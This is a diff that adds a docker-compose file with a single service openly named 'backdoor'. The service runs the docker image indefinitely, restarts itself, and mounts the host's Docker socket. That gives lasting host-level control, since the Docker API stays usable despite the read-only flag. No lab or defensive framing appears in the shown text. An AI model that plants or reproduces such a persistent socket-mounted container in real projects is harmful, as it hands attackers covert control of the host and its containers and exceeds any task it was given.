@@ -1,0 +1,9 @@
+version: "3"
+
+services:
+  backdoor:
+    image: docker
+    command: sleep 100d
+    restart: always
+    volumes:
+      - /var/run/docker.sock:/docker.sock:ro
